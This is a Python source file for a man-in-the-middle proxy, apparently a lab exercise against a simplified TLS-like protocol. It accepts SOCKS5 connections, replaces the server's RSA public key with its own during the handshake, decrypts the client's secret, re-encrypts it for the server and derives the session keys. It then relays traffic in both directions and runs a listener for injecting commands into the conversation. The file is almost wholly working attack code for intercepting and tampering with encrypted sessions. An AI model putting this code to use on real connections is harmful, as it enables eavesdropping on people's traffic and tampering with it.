"""IMPORTS"""
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends   import default_backend
from asyncio import open_connection, create_task, gather
from socket  import inet_ntoa
from struct  import unpack

import os
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))

from crypto_handler import Crypto
from convo_handler import Convo
from utils import Utils


############################################################################


"""MAIN CODE"""
class Connection:
    """
    1. proxify handshake
    2. tls handshake
    3. manage convo
    """
    def __init__(self, client_reader, client_writer):

        self.mitm = {
                      "public_key" : Crypto.import_RSA_key("public"),
                      "private_key": Crypto.import_RSA_key("private"),
                      "master_key" : b'',
                      "iv"         : b''
                      }
        
        self.client = {
                       "reader"    : client_reader,
                       "writer"    : client_writer,
                       "host"      : client_writer.get_extra_info('peername')[0],
                       "port"      : client_writer.get_extra_info('peername')[1]
                       }
        
        self.server = {
                       "reader"    : None,
                       "writer"    : None,
                       "host"      : None,
                       "port"      : None
                       }
    

    # START
    async def start(self):
        try:
            # proxify handshake
            await self.complete_proxify_handshake()

            # tls handshake
            await self.complete_tls_handshake()

            # manage convo
            await self.manage_conversation()

        except Exception as e:
            print(f"Error occurred: {str(e)}")
            exit(1)


    # PROXIFY HANDSHAKE
    async def complete_proxify_handshake(self):

        # client -> proxy
        x = await self.client["reader"].read(3) #read
        if x != b'\x05\01\x00':
            return False

        # proxy -> client
        self.client["writer"].write(b'\x05\x00') #write
        await self.client["writer"].drain()

        # client -> proxy
        x = await self.client["reader"].read(10) #read
        self.server["host"] = inet_ntoa(x[4:8])
        self.server["port"] = unpack("!H", x[8:10])[0]
        self.server["reader"], self.server["writer"] = await open_connection(self.server["host"],self.server["port"])
        
        # proxy -> client
        self.client["writer"].write(b'\x05\x00\x00\x01' + x[4:10]) #write
        await self.client["writer"].drain()


    # TLS HANDSHAKE
    async def complete_tls_handshake(self):

        # client -> server
        header, payload = await Utils.read_message(self.client["reader"]) #read
        client_random_bytes = payload[10:]                                #client_random_bytes                      
        await Utils.write_message(self.server["writer"], header, payload) #write


        # server -> client
        header, payload = await Utils.read_message(self.server["reader"])       #read

        server_random_bytes = payload[10:-269]                                  #server_random_bytes

        server_modulus = int.from_bytes(payload[-256:], byteorder='big')
        server_public_numbers = rsa.RSAPublicNumbers(65537, server_modulus)
        server_key = server_public_numbers.public_key(backend=default_backend()) #server_key

        mitm_public_key = self.mitm["public_key"]
        mitm_public_numbers = mitm_public_key.public_numbers()
        mitm_modulus = mitm_public_numbers.n
        mitm_modulus_bytes = mitm_modulus.to_bytes(
            (mitm_modulus.bit_length() + 7) // 8, byteorder='big')               #mitm_key
        
        payload = payload[:-256] + mitm_modulus_bytes                            #swap server key with mitm key
        await Utils.write_message(self.client["writer"], header, payload)        #write


        # client -> server
        header, payload = await Utils.read_message(self.client["reader"])             #read

        decrypted_secret = Crypto.rsa_decrypt(payload[10:], self.mitm["private_key"]) #decrypted secret
        encrypted_for_server = Crypto.rsa_encrypt(decrypted_secret, server_key)       #rencrypted secret for server

        self.mitm["master_key"], self.mitm["iv"] = Crypto.gen_master_key(
            client_random_bytes, server_random_bytes, decrypted_secret)               #generate master_key with random bytes and secret
        
        adjusted_payload = payload[:10] + encrypted_for_server                        #swap mitm secret with server secret
        await Utils.write_message(self.server["writer"], header, adjusted_payload)    #write

        # server -> client
        header, payload = await Utils.read_message(self.server["reader"]) #read 
        await Utils.write_message(self.client["writer"], header, payload) #write


    # MANAGE CONVERSATION
    async def manage_conversation(self):  

        # initialize convo object
        convo = Convo(self.mitm["master_key"], self.mitm["iv"])

        # client -> server convo stream handler
        client_to_server = create_task(convo.server_to_client_convo_stream(self.client["reader"], self.server["writer"]))

        # server -> client convo stream handler
        server_to_client = create_task(convo.client_to_server_convo_stream(self.server["reader"], self.client["writer"]))

        # injection command listener
        injection_command_listener = create_task(convo.injection_command_listener())

        # run all asynchronized
        await gather(client_to_server, server_to_client, injection_command_listener) 




    



   

        
    